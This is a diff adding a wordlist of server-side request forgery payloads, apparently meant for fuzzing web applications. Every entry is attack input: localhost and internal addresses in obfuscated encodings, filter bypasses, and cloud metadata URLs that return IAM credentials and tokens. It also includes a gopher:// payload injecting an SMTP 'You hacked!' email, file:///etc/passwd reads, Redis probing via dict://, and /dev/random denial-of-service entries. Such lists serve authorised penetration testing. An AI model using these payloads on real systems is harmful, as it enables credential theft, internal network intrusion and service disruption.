@@ -1,0 +1,126 @@
+# SSRF Payloads
+
+# Basic localhost references
+http://localhost/
+http://localhost:80/
+http://localhost:443/
+http://localhost:8080/
+http://127.0.0.1/
+http://127.0.0.1:80/
+http://127.0.0.1:443/
+http://127.0.0.1:8080/
+http://127.0.0.1:22/
+http://0.0.0.0/
+http://0.0.0.0:80/
+http://[::1]/
+http://[::]:80/
+http://2130706433/
+http://017700000001/
+
+# Alternate IP representations
+http://0177.0.0.1/
+http://0x7f.0.0.1/
+http://0x7f000001/
+http://2130706433/
+http://0/
+http://127.1/
+http://127.00000.000000.0001/
+
+# DNS rebinding payloads
+http://attacker-controlled-domain.com/
+http://ssrf.burpcollaborator.net/
+
+# Cloud metadata endpoints
+http://169.254.169.254/latest/meta-data/
+http://metadata.google.internal/computeMetadata/v1/
+http://169.254.169.254/latest/user-data/
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://169.254.170.2/v2/credentials/
+http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance
+
+# Bypass techniques
+127.0.0.1/
+127.0.0.1:80/
+localhost:80/
+[::]:80/
+http://127.1:80/
+http://127.000000000000000.1/
+http://①②⑦.⓪.⓪.①
+http://127.0.0.1%00/
+http://127.0.0.1%0d/
+http://127.0.0.1\u0000
+http://127.0.0.1\u0000/
+http://localhost%23@stock.weliketoshop.net/
+
+# IPv6 bypasses
+http://[::ffff:127.0.0.1]/
+http://[::ffff:127.0.0.1]:80/
+http://[0:0:0:0:0:ffff:7f00:0001]/
+http://[::]:80/
+
+# Open redirection bypass
+http://open.redirect.com?url=http://127.0.0.1/
+http://open.redirect.com?redirect=http://127.0.0.1/
+http://open.redirect.com?url=//127.0.0.1/
+http://open.redirect.com?url=/\/127.0.0.1/
+http://open.redirect.com/http://127.0.0.1/
+
+# DNS with numeric domains bypass
+http://0/
+http://127.1/
+http://127.0.1/
+
+# Domain fronting bypass
+https://fronting-domain.com
+Host: internal-domain.com
+
+# Internal services probing
+http://127.0.0.1:22/
+http://127.0.0.1:3306/
+http://127.0.0.1:5432/
+http://127.0.0.1:6379/
+http://127.0.0.1:8080/
+http://127.0.0.1:9200/
+http://127.0.0.1:27017/
+
+# Internal networks
+http://192.168.0.1/
+http://192.168.1.1/
+http://10.0.0.1/
+http://10.0.0.0/
+http://172.16.0.1/
+http://172.16.0.0/
+http://172.31.255.255/
+
+# URL encoding bypass techniques
+http://127.0.0.1/%0D
+http://127.0.0.1/%0A
+http://127.0.0.1/%09
+http://127.0.0.1/%0C
+http://127.0.0.1/%00
+http%3A%2F%2F127.0.0.1%2F
+http%253A%252F%252F127.0.0.1%252F
+
+# Protocol exploiting
+gopher://127.0.0.1:25/
+gopher://127.0.0.1:25/HELO%20localhost%0D%0AMAIL%20FROM%3A%3Chacker@site.com%3E%0D%0ARCPT%20TO%3A%3Cvictim@site.com%3E%0D%0ADATA%0D%0AFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%0D%0ATo%3A%20%3Cvictim@site.com%3E%0D%0ADate%3A%20Tue%2C%207%20Nov%202017%2017%3A44%3A46%20-0800%0D%0ASubject%3A%20You%20hacked%21%0D%0A%0D%0AHi%20victim%2C%20you%27ve%20been%20hacked%21%0D%0A%0D%0A%2E%0D%0AQUIT%0D%0A
+file:///etc/passwd
+file://\/\/etc/passwd
+dict://127.0.0.1:6379/info
+ftp://127.0.0.1:21/
+http://127.0.0.1:25/%0AHELO%20localhost%0D%0A%0AMAIL%20FROM%3A%20%3Chacker%40site.com%3E%0D%0A%0ARCPT%20TO%3A%20%3Cvictim%40site.com%3E%0D%0A%0ADATA%0D%0A%0AFrom%3A%20%5BHacker%5D%20%3Chacker%40site.com%3E%0D%0A%0ATo%3A%20%3Cvictim%40site.com%3E%0D%0A%0ADate%3A%20Tue%2C%207%20Nov%202017%2017%3A44%3A46%20-0800%0D%0A%0ASubject%3A%20You%20hacked%21%0D%0A%0D%0A%0D%0AHi%20victim%2C%20you%27ve%20been%20hacked%21%0D%0A%0D%0A%0D%0A%2E%0D%0A%0AQUIT%0D%0A
+
+# DOS attempt with a file descriptor URL scheme (use with caution)
+file:///dev/random
+file:///dev/zero
+
+# Advanced URL-encoded bypasses with special characters
+http://127.0.0.1:80%23@stock.weliketoshop.net/
+http://127.0.0.1%2523@stock.weliketoshop.net/
+http://stock.weliketoshop.net@127.0.0.1/
+http://stock.weliketoshop.net@127.0.0.1#/
+http://127.0.0.1%252f%252f@stock.weliketoshop.net/
+http://127.0.0.1/
+http://127.0.0.1/?@stock.weliketoshop.net
+http://127.0.0.1#@stock.weliketoshop.net
